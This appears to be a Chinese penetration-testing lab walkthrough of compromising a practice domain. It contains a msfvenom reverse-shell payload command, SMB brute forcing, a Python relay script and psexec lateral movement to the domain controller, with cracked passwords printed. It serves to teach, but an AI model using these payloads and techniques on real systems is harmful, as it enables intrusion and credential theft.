已完成 16/18 [-] ssh 192.168.93.120:22 root Aa12345 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 16/18 [-] ssh 192.168.93.120:22 admin 654321 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 16/18 [-] ssh 192.168.93.120:22 admin 123qwe!@# ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 16/18 [-] ssh 192.168.93.120:22 admin 1qaz!QAZ ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 17/18 [-] ssh 192.168.93.100:22 root 12345678 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 18/18
[*] 扫描结束,耗时: 7m10.380655245s
```



发现存活主机：

| 主机 | 开放端口 | 操作系统 |
| --- | --- | --- |
| 192.168.93.10 | 135、445、139、88 | WIN-8GA56TNV3MV |
| 192.168.93.20 | 135、80、1433、445、139 | win2008 |
| 192.168.93.30 | 139、135、445 | win7 |
| 192.168.93.120 | 80、22 | Linux |
| 192.168.93.100 | 22、80、3306、 | Linux |




### <font style="color:rgb(79, 79, 79);">使用ssh转发打通内网(正向)</font>
```bash
接下来通过ssh转发功能打通内网(用ssh而不用其他工具是因为目标自带且稳定)

按顺序执行以下命令

ssh -fgN -L 1111:192.168.93.10:445 localhost
 
ssh -fgN -L 2222:192.168.93.20:445 localhost
 
ssh -fgN -L 3333:192.168.93.30:445 localhost

```











### <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">上线 msf</font>
<font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">首先使用msf生成一个shellcode：</font>

`<font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.188.104 LPORT=7890 -f elf > mshell.elf</font>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706761.png)



上传

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707836.png)



kali 监听：

```bash
┌──(xvsf㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Keep track of findings and observations with notes


 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v6.4.116-dev                               ]
+ -- --=[ 2,623 exploits - 1,326 auxiliary - 1,710 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 10 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf exploit(multi/handler) > set lport 7890
lport => 7890
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:7890

```



靶机运行：

```bash
chmod 777 mshell.elf
./mshell.elf
```



```bash
[firefart@localhost tmp]# ls
bak  dirty  dirty.c  fscan  mshell.elf  passwd.bak  yum.log
[firefart@localhost tmp]# chmod 777 mshell.elf
[firefart@localhost tmp]# ./mshell.elf
```



成功上线：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707524.png)





#### 内网信息收集
```bash
meterpreter > route

IPv4 network routes
===================

    Subnet         Netmask        Gateway          Metric  Interface
    ------         -------        -------          ------  ---------
    0.0.0.0        0.0.0.0        192.168.242.168  0       eth3
    10.0.2.0       255.255.255.0  0.0.0.0          0       eth4
    192.168.93.0   255.255.255.0  0.0.0.0          0       eth2
    192.168.242.0  255.255.255.0  0.0.0.0          0       eth3

No IPv6 routes were found.
meterpreter >
```





#### 内网 IP 探测
配置路由

```bash
meterpreter > run autoroute -s 192.168.93.0/24
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.93.0/255.255.255.0...
[+] Added route to 192.168.93.0/255.255.255.0 via 192.168.242.63
[*] Use the -p option to list all active routes
meterpreter > bg
[*] Backgrounding session 1...
msf exploit(multi/handler) > use auxiliary/server/socks_proxy
msf auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf auxiliary(server/socks_proxy) > set srvport 6677
srvport => 6677
msf auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
msf auxiliary(server/socks_proxy) >
[*] Starting the SOCKS proxy server

msf auxiliary(server/socks_proxy) >
```



扫描内网主机

```bash
use auxiliary/scanner/discovery/udp_probe
set rhosts 192.168.93.0-255 （扫主机的时候，最好分段扫描，0-255对于范围还是有些大。导致资源消耗）
set threads 5
run
```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706386.png)



发现存活主机：（上面已经探测过：）

| 主机 | 开放端口 | 操作系统 |
| --- | --- | --- |
| 192.168.93.10 | 135、445、139、88 | WIN-8GA56TNV3MV |
| 192.168.93.20 | 135、80、1433、445、139 | win2008 |
| 192.168.93.30 | 139、135、445 | win7 |
| 192.168.93.120 | 80、22 | Linux |
| 192.168.93.100 | 22、80、3306、 | Linux |






### <font style="color:rgb(79, 79, 79);">爆破smb登陆密码</font>
```bash
msfconsole
 
use scanner/smb/smb_login
 
set RHOSTS 192.168.242.63
 
set SMBUser administrator
 
set pass_file /usr/share/wordlists/rockyou.txt

set RPORT 2222
 
set STOP_ON_SUCCESS true
 
run
```



```bash
┌──(xvsf㉿kali)-[~]
└─$ msfconsole
Metasploit tip: View advanced module options with advanced

Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.4.116-dev                               ]
+ -- --=[ 2,623 exploits - 1,326 auxiliary - 1,710 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 10 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use scanner/smb/smb_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.242.63
RHOSTS => 192.168.242.63
msf auxiliary(scanner/smb/smb_login) > set SMBUser administrator
SMBUser => administrator
msf auxiliary(scanner/smb/smb_login) > set pass_file /usr/share/wordlists/rockyou.txt
pass_file => /usr/share/wordlists/rockyou.txt
msf auxiliary(scanner/smb/smb_login) > set RPORT 2222
RPORT => 2222
msf auxiliary(scanner/smb/smb_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(scanner/smb/smb_login) > run
[*] 192.168.242.63:2222   - 192.168.242.63:2222   - Starting SMB login bruteforce
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:123456',
[!] 192.168.242.63:2222   - No active DB -- Credential data will not be saved!
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:12345',
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:123456789',
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:password',
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:iloveyou',
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:princess',
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:1234567',
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:rockyou',
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:12345678',
[-] 192.168.242.63:2222   - 192.168.242.63:2222   - Failed: '.\administrator:abc123',
..............


```



用 kali 自带的 /usr/share/wordlists/rockyou.txt 爆破了很久都没有成功，看师傅们的 WP 才发现根本没有那个密码。。。



administrator:123qwe!ASD



<font style="color:rgb(77, 77, 77);">接下来使用use exploit/windows/smb/psexec模块来获取会话</font>



### 使用py脚本打通内网(反向)
<font style="color:rgb(77, 77, 77);">上传一个转发脚本到web主机</font>

```python
import socket
import threading
import sys
 
class PortForwarder:
    def __init__(self, lh, lp, th, tp):
        self.lh = lh
        self.lp = lp
        self.th = th
        self.tp = tp
        self.running = False
 
    def forward(self, s, d, sn, dn):
        try:
            while self.running:
                data = s.recv(1024)
                if not data: break
                d.sendall(data)
        except:
            pass
        finally:
            s.close()
            d.close()
 
    def handle(self, cs):
        try:
            ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ts.connect((self.th, self.tp))
            t1 = threading.Thread(target=self.forward, args=(cs, ts, "c", "t"))
            t2 = threading.Thread(target=self.forward, args=(ts, cs, "t", "c"))
            t1.daemon = True
            t2.daemon = True
            t1.start()
            t2.start()
            t1.join()
            t2.join()
        except:
            cs.close()
 
    def start(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.s.bind((self.lh, self.lp))
            self.s.listen(5)
            self.running = True
            while self.running:
                cs, _ = self.s.accept()
                t = threading.Thread(target=self.handle, args=(cs,))
                t.daemon = True
                t.start()
        except:
            pass
        finally:
            self.running = False
            self.s.close()
 
if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python %s <listen_ip> <listen_port> <target_ip> <target_port>" % sys.argv[0])
        sys.exit(1)
    pf = PortForwarder(sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]))
    pf.start()
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706543.png)





```python
python sock.py 0.0.0.0 4444 192.168.188.104 4444 &
 
python sock.py 0.0.0.0 5555 192.168.188.104 5555 &
 
python sock.py 0.0.0.0 6666 192.168.188.104 6666 &
```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706289.png)





<font style="color:rgb(77, 77, 77);">然后回到攻击机开始配置攻击模块        新开一个终端执行以下命令</font>

```python
msfconsole
 
use exploit/windows/smb/psexec
 
set RHOSTS 192.168.242.63
 
set RPORT 2222
 
set SMBUser administrator
 
set SMBPass 123qwe!ASD
 
set LHOST 192.168.93.100
 
set LPORT 5555
 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
 
run
```



```python
┌──(xvsf㉿kali)-[~]
└─$ msfconsole
Metasploit tip: View advanced module options with advanced


         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.4.116-dev                               ]
+ -- --=[ 2,623 exploits - 1,326 auxiliary - 1,710 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 10 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.242.63\
 > Interrupt: use the 'exit' command to quit
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.242.63
RHOSTS => 192.168.242.63
msf exploit(windows/smb/psexec) > set RPORT 2222
RPORT => 2222
msf exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf exploit(windows/smb/psexec) > set SMBPass 123qwe!ASD
SMBPass => 123qwe!ASD
msf exploit(windows/smb/psexec) > set LHOST 192.168.93.100
LHOST => 192.168.93.100
msf exploit(windows/smb/psexec) > set LPORT 5555\
 > Interrupt: use the 'exit' command to quit
msf exploit(windows/smb/psexec) > set LPORT 5555
LPORT => 5555
msf exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > run
[-] Handler failed to bind to 192.168.93.100:5555:-  -
[*] Started reverse TCP handler on 0.0.0.0:5555
[*] 192.168.242.63:2222 - Connecting to the server...
[*] 192.168.242.63:2222 - Authenticating to 192.168.242.63:2222 as user 'administrator'...
[*] 192.168.242.63:2222 - Selecting PowerShell target
[*] 192.168.242.63:2222 - Executing the payload...
[+] 192.168.242.63:2222 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (232006 bytes) to 192.168.242.63
[*] Meterpreter session 1 opened (192.168.188.104:5555 -> 192.168.242.63:43414) at 2026-03-14 10:21:40 -0400

meterpreter >
```



<font style="color:rgb(77, 77, 77);">回车之前先在开一个终端执行下方命令来接收会话</font>

```python
msfconsole
 
use exploit/multi/handler
 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
 
set LHOST 0.0.0.0
 
set LPORT 5555
 
run
```



```python
┌──(xvsf㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Stop all background jobs quickly with jobs -K


                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.4.116-dev                               ]
+ -- --=[ 2,623 exploits - 1,326 auxiliary - 1,710 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 10 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:5555
[*] Sending stage (232006 bytes) to 192.168.242.63
[*] Sending stage (232006 bytes) to 192.168.242.63
[*] Sending stage (232006 bytes) to 192.168.242.63
[*] Meterpreter session 3 opened (192.168.188.104:5555 -> 192.168.242.63:43412) at 2026-03-14 10:21:22 -0400
[*] Meterpreter session 1 opened (192.168.188.104:5555 -> 192.168.242.63:43410) at 2026-03-14 10:21:22 -0400
[*] Meterpreter session 2 opened (192.168.188.104:5555 -> 192.168.242.63:43411) at 2026-03-14 10:21:22 -0400

meterpreter > sysinfo
Computer        : WIN2008
OS              : Windows Server 2008 (6.0 Build 6003, Service Pack 2).
Architecture    : x64
System Language : en_US
Domain          : TEST
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter >
```



#### 拿下 WIN2008
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706727.png)





### <font style="color:rgb(79, 79, 79);">查找域控</font>
<font style="color:rgb(77, 77, 77);">接下来收集信息确认域控ip</font>

<font style="color:rgb(77, 77, 77);">shell</font>

<font style="color:rgb(77, 77, 77);">ipconfig /all</font>

```bash
meterpreter > shell
Process 3064 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6003]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : win2008
   Primary Dns Suffix  . . . . . . . : test.org
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : test.org

Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2
   Physical Address. . . . . . . . . : 52-54-00-41-4A-52
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::1100:8033:af07:970f%11(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.93.20(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   DHCPv6 IAID . . . . . . . . . . . : 257053696
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-25-2C-55-47-00-0C-29-AB-44-EC
   DNS Servers . . . . . . . . . . . : 192.168.93.10
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter Local Area Connection* 8:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : isatap.{068B9879-E9E2-4E57-A217-F4DC130EB3E4}
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

C:\Windows\system32>ping test.org
ping test.org

Pinging test.org [192.168.93.10] with 32 bytes of data:
Reply from 192.168.93.10: bytes=32 time=3ms TTL=128
Reply from 192.168.93.10: bytes=32 time=9ms TTL=128
Reply from 192.168.93.10: bytes=32 time=3ms TTL=128
Reply from 192.168.93.10: bytes=32 time=5ms TTL=128

Ping statistics for 192.168.93.10:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 3ms, Maximum = 9ms, Average = 5ms

C:\Windows\system32>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151705101.png)



<font style="color:rgb(77, 77, 77);">得到域控ip是192.168.93.10跟之前fscan扫描出来的结果一样，也开了445端口，但是密码却不是这两台主机的，所以还是依旧爆破</font>

<font style="color:rgb(77, 77, 77);"></font>

```bash
msfconsole
 
use auxiliary/scanner/smb/smb_login
 
set RHOSTS 192.168.242.63
 
set RPORT 1111
 
set USERNAME administrator
 
set PASS_FILE ""
 
set STOP_ON_SUCCESS
 
run
```

<font style="color:rgb(77, 77, 77);"></font>

<font style="color:rgb(77, 77, 77);">得到密码 zxcASDqw123!!</font>

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">拿下域控</font>
```bash
msfconsole
 
use exploit/windows/smb/psexec
 
set RHOSTS 192.168.242.63
 
set RPORT 1111
 
set SMBUser administrator
 
set SMBPass zxcASDqw123!!
 
set LHOST 192.168.93.10
 
set LPORT 4444
 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
 
run
```

```bash
msfconsole
 
use exploit/multi/handler
 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
 
set LHOST 0.0.0.0
 
set LPORT 4444
 
run
```



```bash
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.242.63
RHOSTS => 192.168.242.63
msf exploit(windows/smb/psexec) > set RPORT 1111
RPORT => 1111
msf exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf exploit(windows/smb/psexec) > set SMBPass zxcASDqw123!!
SMBPass => zxcASDqw123!!
msf exploit(windows/smb/psexec) > set LHOST 192.168.93.10
LHOST => 192.168.93.100
msf exploit(windows/smb/psexec) > set LPORT 4444
LPORT => 4444
msf exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > run
[-] Handler failed to bind to 192.168.93.10:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] 192.168.242.63:1111 - Connecting to the server...
[*] 192.168.242.63:1111 - Authenticating to 192.168.242.63:1111 as user 'administrator'...
[*] 192.168.242.63:1111 - Selecting PowerShell target
[*] 192.168.242.63:1111 - Executing the payload...
[+] 192.168.242.63:1111 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
msf exploit(windows/smb/psexec) >
```

```bash
msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Sending stage (232006 bytes) to 192.168.242.63
[*] Meterpreter session 5 opened (192.168.188.104:4444 -> 192.168.242.63:43783) at 2026-03-14 10:35:38 -0400

meterpreter > sysinfo
Computer        : WIN-8GA56TNV3MV
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : TEST
Logged On Users : 4
Meterpreter     : x64/windows
meterpreter >
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706195.png)

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">拿下ubuntu</font>


### ssh 登录
wwwuser/wwwuser_123Aqx



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707259.png)

